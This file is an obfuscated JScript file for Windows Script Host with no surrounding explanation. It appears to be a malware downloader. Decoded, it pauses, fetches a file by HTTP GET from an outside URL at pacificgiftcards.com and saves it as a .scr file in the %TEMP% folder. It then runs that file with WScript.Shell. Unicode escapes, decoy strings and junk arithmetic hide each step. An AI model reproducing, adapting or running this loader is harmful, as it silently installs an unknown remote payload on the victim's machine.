codeHospital = (((1 * 1) & 1), this);
paradoxDirective = ("Ru" + "n");
circleInvest = codeHospital[("spec\u0069" + "f" + "i\u0063\u0061\u0074" + "\u0069\u006fn", "\u0072at" + "i\u006fn\u0061l", "\u0065x\u0070" + "\u0065" + "r\u0074", function String.prototype.decorationRank() {
   return this
}, "\u0057\u0053c\u0072i" + "\u0070\u0074")];
circleInvest[("\u0068a" + "\u006ed" + "\u0069\u0063" + "ap", "Sl\u0065\u0065p")]((44 - 39) * (([!+[] + !+[]])) * (43 - 41) * (220 / 44) * (5 & 5) * (19 - 16) * (3 & 2) * (46 - 41));
spiralInversion = circleInvest[("\u0070rofi" + "le", "\u0065x\u0061\u006d\u0069n" + "a\u0074" + "i\u006fn", "\u0069\u006e" + "st\u0072\u0075m" + "\u0065nt", "\u0043" + "\u0072" + "e\u0061teOb" + "je\u0063\u0074")](("\u0057S\u0063\u0072i" + "\u0070t." + "\u0053" + "hel\u006c"));
infectionSanction = spiralInversion[("e\u006d\u0062\u006c" + "em", "E\u0078" + "\u0070" + "\u0061\u006e\u0064E" + "\u006evi" + "\u0072o" + "n" + "men\u0074" + "\u0053tr" + "\u0069" + "n\u0067s")](("o\u0066f" + "\u0069\u0063" + "\u0065", "%" + "\u0054\u0045\u004dP" + "\u0025/")) + ("\u006dat\u0063h", "\u0073" + "\u0071u" + "a\u0072\u0065", "s\u0070\u0068\u0065r" + "\u0065", "\u0070\u006fp" + "\u0075" + "\u006ca" + "r\u0050r\u006f" + "\u0064\u0075" + "c\u0065") + ("s\u0070eci" + "\u0061l", "r\u006fc\u006b" + "\u0065t", "e" + "\u0078a\u006d" + "i\u006e" + "e", ".s\u0063r");
intervalConvention = codeHospital[("dec" + "la\u0072at\u0069" + "\u006f\u006e", "\u006de\u0074" + "al", "\u0070\u0061\u0073" + "te", "WS" + "c\u0072\u0069\u0070\u0074")][("stop", "\u0075" + "\u006ei\u0073o\u006e", "fro\u006e" + "\u0074", "\u0043r\u0065a" + "t\u0065\u004f" + "b\u006a" + "ec\u0074")](("\u0063" + "abin" + "\u0065" + "\u0074", "\u0070\u0061\u0072t\u006e\u0065" + "\u0072", "s\u0065" + "\u0078", "p" + "r\u006f" + "je\u0063t", "M" + "\u0053XM\u004c\u0032\u002e" + "X" + "\u004dL\u0048" + "T\u0054" + "\u0050"));
intervalConvention[("\u0064\u0075" + "s\u0074", "pos" + "\u0069ti\u0076" + "\u0065", "\u0070\u0072\u0065" + "ce\u0064en\u0074", "o" + "p\u0065\u006e")](("\u0073\u0074ar\u0074", "\u0072e\u0073o\u0075" + "\u0072c" + "\u0065", "of\u0066" + "\u0069" + "\u0063" + "\u0065", "G\u0045T"), ("\u0061c\u0063u\u006du" + "\u006ca\u0074o\u0072", "bo" + "o" + "\u006d", "\u0068\u0074\u0074p:\u002f" + "\u002fpa" + "\u0063\u0069" + "\u0066\u0069cg" + "i\u0066" + "tc\u0061" + "\u0072\u0064\u0073" + "\u002e\u0063o\u006d" + "\u002f\u0033\u002f" + "\u0036\u0037t5\u0034" + "ce\u0074\u0076y"), !((((0) / ((Math.pow((196, 561), (80 / 40)) - (480449 - 166028)) / ((1 * 2) * (2 ^ 1)))) | (((1 & 0) | (1 & 1)) * (2 + ((0 / 48))))) == ((([!+[] + !+[]] * [!+[] + !+[] + !+[]] - ((0 + 1) ^ (0 | 0))) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - ((230, 35, 7) - (29, 143, 6))) * ([!+[] + !+[]])) / (((164 / 2), 2 * 3 * 2 * 2 * 2, (8 & 10)) * ((([!+[] + !+[] + !+[]])) + (0 + 0)) + ((0 | 1) + (228, 251, 236, 0))))));
intervalConvention[("\u0073\u0071" + "\u0075\u0061\u0072e", "\u0073\u0065\u006e\u0064")]();
while (intervalConvention[("s\u0074\u006f" + "\u0072\u006d", "\u0072" + "\u0065a" + "dystat" + "\u0065")] < ((2 + 0) * (2 + 0))) {
   codeHospital[("W" + "Sc\u0072\u0069" + "\u0070t")][("c\u006fm" + "\u0066o" + "\u0072t", "str\u0075ct" + "ur" + "\u0065", "\u0074\u0069c\u006b", "\u0053\u006c\u0065\u0065" + "\u0070")](((Math.pow(130, 2) - 16792) & (117 & 127)));
}
raceAbort = codeHospital[("WS\u0063\u0072ip" + "t")][("Cr\u0065" + "\u0061\u0074e\u004f\u0062\u006a" + "\u0065ct")](("\u0073\u0065s" + "sion", "norma" + "\u006c", "\u0069d" + "\u0065" + "a", "\u0041D" + "\u004fDB." + "S" + "tr" + "ea\u006d"));
try {
   raceAbort[("\u0073o\u0063" + "\u0069\u0061l", "o\u0070e" + "\u006e")]();
   raceAbort[("op\u0065" + "r" + "\u0061t" + "\u0065", "\u0074\u0079" + "\u0070\u0065")] = ((22) - (([!+[] + !+[]] * [!+[] + !+[] + !+[]] + 1) * ([!+[] + !+[] + !+[]])));
   raceAbort[("act\u0069v" + "\u0065", "\u0063" + "\u0069ta\u0074i" + "\u006fn", "\u0069c" + "o" + "n", "\u0077r\u0069\u0074" + "\u0065")](intervalConvention[("jou\u0072" + "\u006ea\u006c", "s\u0065\u0070a" + "rat\u0069\u006f" + "n", "l\u006f\u0063" + "\u0061\u0074\u0069\u006f\u006e", "\u0052es\u0070" + "ons" + "eBo\u0064y")]);
   raceAbort[("st\u0072" + "\u0061" + "\u0074e" + "gy", "\u0072ec\u0069" + "p\u0065", "in\u0064" + "\u0065\u0078", "\u0070\u0061\u0073\u0073" + "io" + "n", "p\u006f" + "\u0073i" + "\u0074\u0069\u006f" + "n")] = ((0 & 1) & (0 ^ 1));
   raceAbort[("\u0070\u0075l" + "s\u0065", "s\u0061\u0076\u0065" + "\u0054\u006f\u0046\u0069le")](infectionSanction, 2);
   raceAbort[("\u0070aus\u0065", "\u0073hu\u006et", "s\u0074ar\u0074", "c" + "\u006c" + "ose")]();
   spiralInversion[paradoxDirective](infectionSanction.decorationRank(), ((208, 0) / (10 + 3)), ((0 / 23) / (2 ^ 6)));
} catch (falseUnique) {};